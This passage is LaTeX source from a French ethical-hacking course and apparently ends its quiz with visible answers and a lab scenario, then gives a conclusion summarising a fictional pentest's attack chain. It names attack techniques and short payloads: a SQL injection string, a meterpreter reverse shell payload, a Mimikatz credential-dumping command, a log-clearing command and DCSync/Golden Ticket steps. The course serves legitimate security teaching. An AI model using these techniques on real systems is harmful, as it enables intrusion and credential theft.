        \item[A.] Les scans de ports.
        \item[B.] Les injections SQL.
        \item[C.] Les attaques XSS.
        \item[D.] L'énumération DNS.
    \end{itemize}

    \item Quelle est la différence entre LFI et RFI ?
    \begin{itemize}
        \item[A.] LFI est à distance, RFI est local.
        \item[B.] LFI inclut des fichiers locaux, RFI inclut des fichiers distants.
        \item[C.] LFI est pour Linux, RFI est pour Windows.
        \item[D.] Il n'y a pas de différence.
    \end{itemize}
\end{enumerate}

\subsection*{Module 5 : Post-Exploitation et Mouvement Latéral}
\begin{enumerate}
    \setcounter{enumi}{17}
    \item L'escalade de privilèges consiste à :
    \begin{itemize}
        \item[A.] Passer d'un compte standard à un compte administrateur/root.
        \item[B.] Passer d'un serveur à un autre.
        \item[C.] Changer le mot de passe d'un utilisateur.
        \item[D.] Effacer les logs.
    \end{itemize}

    \item L'outil \texttt{Mimikatz} est célèbre pour :
    \begin{itemize}
        \item[A.] Scanner les vulnérabilités web.
        \item[B.] Extraire les mots de passe et hashs de la mémoire Windows (LSASS).
        \item[C.] Effectuer des scans de ports furtifs.
        \item[D.] Analyser les fichiers PDF.
    \end{itemize}

    \item La technique "Pass-the-Hash" permet de :
    \begin{itemize}
        \item[A.] Craquer un hash pour trouver le mot de passe en clair.
        \item[B.] S'authentifier en utilisant directement le hash du mot de passe.
        \item[C.] Modifier le hash dans la base SAM.
        \item[D.] Créer un nouvel utilisateur.
    \end{itemize}

    \item L'outil \texttt{BloodHound} sert à :
    \begin{itemize}
        \item[A.] Surveiller le trafic réseau en temps réel.
        \item[B.] Visualiser les relations d'attaque dans un environnement Active Directory.
        \item[C.] Détecter les malwares sur le disque.
        \item[D.] Renforcer les pare-feu.
    \end{itemize}

    \item Le "Pivoting" consiste à :
    \begin{itemize}
        \item[A.] Tourner le disque dur pour un accès physique.
        \item[B.] Utiliser une machine compromise pour attaquer un réseau inaccessible.
        \item[C.] Retourner à la case de l'attaquant.
        \item[D.] Changer d'adresse IP publique.
    \end{itemize}
\end{enumerate}

\subsection*{Module 6 : Évasion et Anti-Forensics}
\begin{enumerate}
    \setcounter{enumi}{22}
    \item L'antivirus détecte généralement Mimikatz via :
    \begin{itemize}
        \item[A.] La détection comportementale.
        \item[B.] La signature de fichier (statique).
        \item[C.] L'analyse du disque dur exclusivement.
        \item[D.] L'analyse du cache navigateur.
    \end{itemize}

    \item La technique "Living Off The Land" (LoL) implique d'utiliser :
    \begin{itemize}
        \item[A.] Des outils tiers téléchargés depuis GitHub.
        \item[B.] Des outils légitimes du système (ex: Certutil, PowerShell) pour l'attaque.
        \item[C.] Des outils payants.
        \item[D.] Un live CD Linux.
    \end{itemize}

    \item Le but de l'obfuscation de code est de :
    \begin{itemize}
        \item[A.] Améliorer la lisibilité du code.
        \item[B.] Rendre le code plus rapide.
        \item[C.] Modifier le code pour éviter la détection par signature.
        \item[D.] Compresser le code.
    \end{itemize}

    \item AMSI (Antimalware Scan Interface) est conçu pour :
    \begin{itemize}
        \item[A.] Bloquer les ports non utilisés.
        \item[B.] Scanner le contenu des scripts (PowerShell, VBS) avant exécution.
        \item[C.] Filtrer les emails.
        \item[D.] Chiffrer le disque dur.
    \end{itemize}
\end{enumerate}

\subsection*{Module 7 : Rapport et Remédiation}
\begin{enumerate}
    \setcounter{enumi}{26}
    \item La partie "Executive Summary" d'un rapport est destinée à :
    \begin{itemize}
        \item[A.] Les équipes techniques.
        \item[B.] Les développeurs.
        \item[C.] La direction (PDG, RSSI).
        \item[D.] Le support client.
    \end{itemize}

    \item Le score CVSS mesure :
    \begin{itemize}
        \item[A.] Le coût financier d'une faille.
        \item[B.] La gravité d'une vulnérabilité (de 0 à 10).
        \item[C.] Le temps de correction.
        \item[D.] La complexité du code.
    \end{itemize}

    \item Quelle est la meilleure pratique pour proposer une correction ?
    \begin{itemize}
        \item[A.] Corriger la faille immédiatement sans dire au client.
        \item[B.] Proposer une compensation (ex: bloquer le port) si la mise à jour n'est pas possible.
        \item[C.] Ignorer la faille si elle est difficile à exploiter.
        \item[D.] Demander une augmentation de budget.
    \end{itemize}

    \item La preuve de concept (PoC) dans un rapport sert à :
    \begin{itemize}
        \item[A.] Prouver que l'attaquant n'a pas menti sur la compromission.
        \item[B.] Montrer le code source de l'outil utilisé.
        \item[C.] Faire de la publicité pour un outil.
        \item[D.] Remplir des pages.
    \end{itemize}
\end{enumerate}

% ------------------------------------------------------------------------------
\section{Partie B : Vrai ou Faux}
% ------------------------------------------------------------------------------

\begin{enumerate}
    \item \textbf{V/F} : Il est légal de scanner n'importe quel site web sans autorisation. \textbf{(Faux - Le scan actif nécessite une autorisation préalable)}
    \item \textbf{V/F} : Le "SYN Scan" est plus furtif que le "Connect Scan". \textbf{(Vrai - Il n'établit pas la connexion complète)}
    \item \textbf{V/F} : Une attaque "Black Box" signifie que l'attaquant a accès au code source. \textbf{(Faux - C'est "White Box")}
    \item \textbf{V/F} : Le Pass-the-Hash fonctionne principalement avec le protocole Kerberos. \textbf{(Faux - C'est NTLM)}
    \item \textbf{V/F} : L'injection SQL de type "Error Based" affiche des messages d'erreur SQL sur la page web. \textbf{(Vrai)}
    \item \textbf{V/F} : L'outil \texttt{Hydra} est utilisé pour les injections SQL. \textbf{(Faux - Il sert au brute forcing de mots de passe)}
    \item \textbf{V/F} : Le "Kernel Exploit" est une technique d'escalade de privilèges Linux. \textbf{(Vrai)}
    \item \textbf{V/F} : Effacer les logs Windows (\texttt{wevtutil cl}) est une action silencieuse et indétectable. \textbf{(Faux - L'effacement crée un événement "Log Cleared")}
    \item \textbf{V/F} : Le "Pivoting" permet d'accéder à des réseaux internes via une machine compromise en DMZ. \textbf{(Vrai)}
    \item \textbf{V/F} : Un score CVSS de 2.0 indique une vulnérabilité critique. \textbf{(Faux - C'est faible. Critique est généralement > 9.0)}
\end{enumerate}

% ------------------------------------------------------------------------------
\section{Partie C : Questions Ouvertes}
% ------------------------------------------------------------------------------

\begin{enumerate}
    \item Expliquez la différence fondamentale entre un "Reverse Shell" et un "Bind Shell" en termes de connexion réseau et contournement de pare-feu.
    \item Décrivez les 3 étapes de l'exploitation d'une injection SQL de type "Union Based" (Détection, Nombre de colonnes, Type de données).
    \item Pourquoi l'utilisation d'outils légitimes ("Living Off The Land") est-elle plus difficile à détecter que le dépôt d'un exécutable externe (comme Mimikatz.exe) ?
    \item Expliquez le concept de "Pivoting" et pourquoi il est nécessaire lors d'un pentest d'une architecture avec une DMZ et un LAN.
    \item Quelle est la différence entre la détection statique (signature) et la détection comportementale (heuristique) dans un antivirus ?
    \item Pourquoi est-il recommandé de ne pas éteindre un serveur compromis lors d'une investigation forensique ?
    \item Expliquez ce qu'est le "Null Session" en énumération SMB et quel type d'information il permet de récupérer.
    \item Définissez le concept de "Credential Dumping" et citez un outil majeur pour le réaliser sous Windows.
\end{enumerate}

% ------------------------------------------------------------------------------
\section{Partie D : Cas Pratique - Capture The Flag}
% ------------------------------------------------------------------------------

\subsection{Scénario : Audit du Serveur Web de LiZbiZ}

\begin{displayquote}
Vous êtes connectés au réseau interne de LiZbiZ (Lab GNS3). On vous demande de compromettre le serveur Web interne (IP : 192.168.1.50) et de récupérer le fichier confidentiel stocké sur le serveur de fichiers interne.
\end{displayquote}

\textbf{Questions et tâches :}

\begin{enumerate}
    \item \textbf{Reconnaissance :} Utilisez \texttt{nmap} pour identifier le système d'exploitation et les services ouverts sur la cible (192.168.1.50). Quels sont les ports ouverts ?
    \item \textbf{Énumération :} En utilisant un navigateur ou \texttt{curl}, identifiez le CMS utilisé (ex: WordPress). Quels fichiers/dossiers sensibles sont accessibles (Directory Busting) ?
    \item \textbf{Exploitation :} Vous découvrez une page de login vulnérable. Proposez une attaque par injection SQL (ou brute force si simple) pour accéder au compte administrateur.
    \item \textbf{Post-Exploitation :} Une fois connecté, comment obtenez-vous un shell sur le serveur ? (Indice : Web Shell ou exécution de commande).
    \item \textbf{Élévation de Privilèges :} Vérifiez les permissions sudo ou les capacités du kernel. Comment passez-vous de l'utilisateur 'www-data' à 'root' ?
    \item \textbf{Preuve :} Récupérez le contenu du fichier \texttt{/root/flag.txt}. Indiquez le hash contenu.
\end{enumerate}

% --- Conclusion Générale ---
% ==============================================================================
% Fichier     : chapitres/00_Conclusion.tex
% Titre       : Conclusion Générale, Cours de Hacking Éthique
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel

% ==============================================================================

\chapter*{Conclusion Générale}
\addcontentsline{toc}{chapter}{Conclusion Générale}
\markboth{Conclusion Générale}{Conclusion Générale}

\begin{flushright}
    \itshape
    <<~La sécurité n'est pas un produit, c'est un processus.~>>\\[0.5ex]
    \small--- Bruce Schneier
\end{flushright}

\vspace{1.5ex}

% ==============================================================================
\section*{Ce que Vous Avez Appris}
% ==============================================================================

Au terme de ce parcours offensif, vous avez traversé l'intégralité de la
chaîne d'attaque qui structure le métier de pentester, de la toute première
requête \sigle{DNS} passive jusqu'à la remise du rapport contradictoire avec
plan de remédiation priorisé. Ce cheminement révèle une vérité fondamentale
que seule la pratique peut enseigner : \textit{une infrastructure n'est
jamais plus solide que son maillon le plus faible}, et ce maillon n'est
presque jamais là où on l'attend.

Vous avez compris que le hacking éthique n'est pas une collection de
\og{}tricks\fg{} techniques, mais une \textbf{discipline intellectuelle
structurée} : observer avant d'agir, documenter chaque pas, mesurer l'impact
réel avant de l'exposer, et toujours replacer la technique dans son contexte
métier. La valeur d'un pentest se mesure moins au nombre de shells obtenus
qu'à la clarté des recommandations transmises à la direction.

% ==============================================================================
\section*{Synthèse du Parcours d'Attaque LiZbiZ}
% ==============================================================================

\begin{boxresume}
\textbf{Le scénario LiZbiZ a illustré, de bout en bout, un cycle d'attaque
complet en 8 phases, avec mapping MITRE ATT\&CK :}

\begin{enumerate}
    \item \textbf{Reconnaissance \sigle{OSINT}} \hfill \textit{TA0043}\\
          Découverte passive : 47 emails internes via Google Dork
          (\texttt{filetype:xls "employés"}), compte \texttt{admin-it}
          via métadonnées ExifTool, Apache~2.2.22 via Shodan, sous-domaines
          internes via transfert \sigle{AXFR} et Certificate Transparency logs.

    \item \textbf{Scanning actif et énumération} \hfill \textit{TA0043}\\
          Cartographie réseau complète : détection Apache~2.2.22 non patché,
          Windows Server 2012~R2 exposé port~445, \sigle{LDAP} anonymous bind,
          3 comptes de service avec \sigle{SPN} (cibles Kerberoasting),
          politique sans verrouillage de compte.

    \item \textbf{Phishing opérationnel} \hfill \textit{T1566.002}\\
          Campagne GoPhish sur 47 cibles, taux de clic 34\%, 11 credentials
          capturés dont \texttt{admin-it@lizbiz.com / LiZbiZ2024!}.

    \item \textbf{Exploitation web} \hfill \textit{T1190, T1059.007}\\
          Injection SQL (\texttt{' OR '1'='1' --}) sur le formulaire de
          connexion, extraction de 47 comptes. \sigle{XSS} stored sur
          l'intranet, vol du cookie de session administrateur. \sigle{LFI}
          + Log Poisoning → shell \texttt{www-data} sur le serveur \sigle{DMZ}.

    \item \textbf{Exploitation système} \hfill \textit{T1210}\\
          EternalBlue (\sigle{MS17-010}) sur Windows Server 2012~R2 —
          shell \texttt{NT AUTHORITY\textbackslash{}SYSTEM} obtenu en 28~secondes.
          Payload \texttt{windows/x64/meterpreter/reverse\_tcp}.

    \item \textbf{Post-exploitation et mouvement latéral} \hfill \textit{T1548, T1003, T1550}\\
          Escalade \texttt{sudo vim} → \texttt{root} (serveur Linux).
          Tunnel Chisel \sigle{DMZ} → \sigle{LAN}. Mimikatz
          \texttt{sekurlsa::logonpasswords} → hash + mot de passe en clair
          \texttt{admin-it}. Pass-the-Hash vers le Contrôleur de Domaine.

    \item \textbf{Compromission Active Directory} \hfill \textit{T1558.003, T1003.006, T1558.001}\\
          Kerberoasting → mot de passe \texttt{svc\_backup} cracké (hashcat).
          DCSync → dump complet du domaine incluant hash \texttt{krbtgt}.
          Golden Ticket forgé → persistance illimitée sur \texttt{lizbiz.local}.

    \item \textbf{Rapport et remédiation} \hfill \textit{N/A}\\
          20 fiches de vulnérabilités avec scores \sigle{CVSS v3.1} et
          références \sigle{MITRE ATT\&CK}. Plan de remédiation priorisé.
          Débriefing en 3 temps (exécutif, technique, plan d'action).
\end{enumerate}
\end{boxresume}

% ==============================================================================
\section*{Compétences Consolidées}
% ==============================================================================

Ce parcours a forgé des compétences directement transférables en milieu
professionnel :

\begin{itemize}
    \item \textbf{Rigueur méthodologique}, L'application des standards \sigle{PTES},
          \sigle{NIST SP 800-115} et \sigle{MITRE ATT\&CK} distingue le
          professionnel du \textit{script-kiddie}. Chaque technique est
          documentée, horodatée et rattachée à une tactique connue des
          équipes défensives.

    \item \textbf{Conscience juridique}, Savoir précisément où s'arrête
          le mandat et où commence le délit, dans les deux juridictions
          étudiées (France et Cameroun). La chaîne de custody des preuves
          est une compétence autant juridique que technique.

    \item \textbf{Communication biface}, Rédiger un Executive Summary
          compréhensible par un \sigle{PDG} et une fiche de vulnérabilité
          exploitable par un développeur : les deux formats sont aussi
          importants que les exploits eux-mêmes.

    \item \textbf{Réflexivité défensive}, Comprendre l'attaque pour
          concevoir la contre-mesure. Pour chaque technique offensive
          présentée, une contre-mesure défensive a été identifiée :
          Kerberoasting → mots de passe longs sur les comptes de service ;
          Golden Ticket → rotation du compte \texttt{krbtgt} ;
          fileless → Credential Guard, surveillance comportementale.

    \item \textbf{Vision hybride}, L'architecture LiZbiZ (on-premise +
          cloud) reflète la réalité des \sigle{SI} modernes. Le pentester
          contemporain doit maîtriser autant les attaques \sigle{AD}
          classiques que les \sigle{SSRF} vers les endpoints \sigle{IMDS}
          cloud (169.254.169.254) et les misconfigurations \sigle{IAM}.
\end{itemize}

% ==============================================================================
\section*{Les Vecteurs Émergents : Ce que le Cours Ne Couvre Pas Encore}
% ==============================================================================

La cybersécurité offensive est un domaine en évolution permanente. Plusieurs
vecteurs, mentionnés en modules optionnels dans ce cours, méritent une
attention particulière dans la pratique professionnelle de 2025--2026 :

\begin{itemize}
    \item \textbf{Cloud Security Posture}, Les misconfigurations \sigle{AWS}/Azure/\sigle{GCP}
          (buckets S3 publics, politiques \sigle{IAM} excessives, \sigle{SSRF}
          vers l'\sigle{IMDS}) représentent une part croissante des
          compromissions réelles. Le passage de l'on-premise au cloud
          ne réduit pas la surface d'attaque, il la déplace.

    \item \textbf{Supply Chain Attacks}, SolarWinds, Log4j, MoveIT ont
          démontré qu'un seul composant tiers compromis peut propager une
          attaque à des milliers d'organisations simultanément. L'audit
          des dépendances logicielles (\sigle{SBOM}) devient une compétence
          indispensable.

    \item \textbf{Adversarial \sigle{AI}}, L'utilisation de modèles de
          langage pour automatiser la génération de prétextes de phishing
          hyper-personnalisés, l'obfuscation de code et la découverte de
          vulnérabilités logicielles redéfinit les capacités offensives à
          la portée d'acteurs peu qualifiés.

    \item \textbf{Zero Trust Architecture}, Face à l'évolution des
          menaces, le modèle périmétrique traditionnel cède la place au
          \textit{Zero Trust} : \og{}ne jamais faire confiance, toujours
          vérifier\fg{}. Comprendre ce modèle est indispensable pour
          concevoir des tests d'intrusion pertinents dans ces
          environnements.
\end{itemize}

% ==============================================================================
\section*{La Complémentarité Audit / Pentest}
% ==============================================================================

Ce cours clôt une séquence pédagogique commencée avec le Cours d'Audit des
Systèmes d'Information. La complémentarité entre ces deux disciplines est
profonde et fondamentale :

\begin{center}
\begin{tabular}{p{4cm}p{4.5cm}p{4.5cm}}
\toprule
\textbf{Dimension} & \textbf{Audit \sigle{SI}} & \textbf{Pentest} \\
\midrule
Objet & Conception des contrôles & Résistance des contrôles \\
Méthode & Revue documentaire & Simulation d'attaque \\
Posture & Évaluation & Confrontation \\
Livrable & Rapport de conformité & Rapport de compromission \\
Question & \og{}Les contrôles existent-ils ?\fg{} & \og{}Les contrôles résistent-ils ?\fg{} \\
\bottomrule
\end{tabular}
\end{center}

\medskip
L'un sans l'autre est incomplet. Un audit sans pentest évalue des contrôles
dont l'effectivité n'est pas prouvée. Un pentest sans audit préalable manque
le contexte organisationnel qui donne sens aux vulnérabilités découvertes.
C'est précisément cette dualité, évaluer et tester, qui structure la
pratique du \sigle{RSSI} contemporain.

\begin{boxinfo}
\textbf{Certifications recommandées pour aller plus loin :}
\begin{itemize}
    \item \textbf{\sigle{OSCP}} (\textit{Offensive Security Certified
          Professional}, Offensive Security), la référence mondiale du
          pentest technique : examen pratique de 24h, accès non guidé à
          plusieurs machines.
    \item \textbf{\sigle{PNPT}} (\textit{Practical Network Penetration
          Tester}, TCM Security), orienté pentest complet et reporting,
          accessible aux débutants, reconnu en entreprise.
    \item \textbf{\sigle{CEH}} (\textit{Certified Ethical Hacker},
          EC-Council), largement reconnu en entreprise, particulièrement
          dans les appels d'offres publics africains.
    \item \textbf{\sigle{GPEN}} (GIAC Penetration Tester, SANS) —
          orienté méthodologie et reporting, reconnu dans les contrats
          gouvernementaux.
    \item \textbf{\sigle{CRTO}} (\textit{Certified Red Team Operator},
          Zero Point Security), spécialisé Active Directory, infrastructure
          C2 (Cobalt Strike, Havoc) et \sigle{OPSEC} avancée.
    \item \textbf{\sigle{CISA} / \sigle{CISM}} (ISACA), pour ancrer
          la compétence offensive dans la gouvernance \sigle{SI} et la
          gestion des risques ; particulièrement valorisés dans les
          organisations publiques et les institutions financières.
\end{itemize}
\end{boxinfo}

% ==============================================================================
\section*{Mot Final}
% ==============================================================================

Attaquer pour défendre est une posture intellectuellement exigeante. Elle
requiert de comprendre les systèmes en profondeur, d'anticiper les erreurs
humaines, de modéliser les comportements adverses, et de tout cela,
d'extraire des recommandations utiles, honnêtes et actionnables.

Ce que ce cours vous a, en dernier lieu, appris à faire, c'est \textbf{lire
une infrastructure comme un attaquant et l'expliquer comme un défenseur}.
Cette double lecture est rare. Elle est précieuse. Elle est ce que les
organisations recherchent dans un \sigle{RSSI} de qualité.

Le pentester professionnel est, en définitive, un \textbf{avocat du diable
au service de la sécurité} : il incarne temporairement l'adversaire pour
mieux armer l'organisation contre lui. Cette mission, lorsqu'elle est
exercée avec rigueur, intégrité et dans le respect des cadres légaux —
camerounais comme internationaux, est l'une des plus utiles que puisse
remplir un expert en cybersécurité.

\vspace{2ex}
\begin{center}
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}\\[0.8ex]
    {\small\itshape\color{CouleurPrimaire}
        Rédigé avec la conviction que la maîtrise technique ne prend de sens\\
        que lorsqu'elle est mise au service d'une éthique professionnelle irréprochable.}\\[0.5ex]
    {\small\bfseries\color{CouleurPrimaire}\auteurcours}\\[0.3ex]
    {\footnotesize\color{CouleurBordInfo}\itshape
        \institutionprimaire{} --- \anneescolaire}\\[0.8ex]
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}
\end{center}


% ==============================================================================
% MATIÈRE POSTLIMINAIRE
% ==============================================================================
\backmatter

% --- Bibliographie ---
\clearpage
\printbibliography[
    heading=bibintoc,
    title={Bibliographie et Références}
]

% --- À Propos de l'Auteur ---
\clearpage
\input{chapitres/Apropos_Auteur}

% --- Index ---
\clearpage
\printindex
\addcontentsline{toc}{chapter}{Index}

% ==============================================================================
% 4ÈME DE COUVERTURE
% ==============================================================================
\clearpage
\thispagestyle{empty}
\pagecolor{CouleurPrimaire}

\begin{tikzpicture}[remember picture, overlay]
    \fill[CouleurAccent]
        (current page.south west) rectangle
        ([yshift=1.8cm] current page.south east);
    \fill[CouleurAccent]
        ([yshift=-1.4cm] current page.north west) rectangle
        ([yshift=-1.7cm] current page.north east);
\end{tikzpicture}

\vspace*{2.5cm}

\begin{center}
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}\\[1.5ex]
    {\color{white}\Large\bfseries À propos de ce cours}\\[1.5ex]
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}
\end{center}

\vspace{1cm}

\begin{center}
\begin{minipage}{0.75\textwidth}
\color{white!85!gray}\setstretch{1.4}
Ce cours propose une formation complète et opérationnelle au \textbf{hacking éthique} et aux \textbf{tests d'intrusion professionnels}. Articulé autour de la mission pentest de l'entreprise fictive LiZbiZ, il couvre l'intégralité de la chaîne offensive — de la reconnaissance OSINT jusqu'à la rédaction du rapport de restitution.

\medskip

Il s'adresse aux étudiants en cybersécurité, aux futurs RSSI et aux professionnels souhaitant acquérir une compréhension approfondie des techniques d'attaque pour mieux concevoir les défenses. Les méthodologies PTES, OSSTMM et NIST SP 800-115 encadrent l'ensemble de la démarche.

\medskip

Les thèmes abordés incluent : OSINT, scanning Nmap, injection SQL, Metasploit, escalade de privilèges Linux et Windows, mouvement latéral Active Directory, Mimikatz, Living Off The Land, anti-forensics, et scoring CVSS.
\end{minipage}
\end{center}

\vfill

\begin{center}
    {\color{CouleurAccent}\rule{0.5\linewidth}{0.8pt}}\\[1ex]
    {\color{white}\bfseries MINKA MI NGUIDJOÏ Thierry Emmanuel}\\[0.3ex]
    {\color{white!75!gray}\footnotesize
        CISA · CISM · CGEIT · CRISC · CDPSE}\\[0.3ex]
    {\color{white!65!gray}\footnotesize\itshape
        Chercheur — LIMSI, Université de Yaoundé~I · Cameroun}\\[1ex]
    {\color{CouleurAccent}\rule{0.5\linewidth}{0.8pt}}
\end{center}

\vspace{1cm}

\afterpage{\nopagecolor}

\end{document}
% ==============================================================================
% Fin de Cours.tex
% ==============================================================================
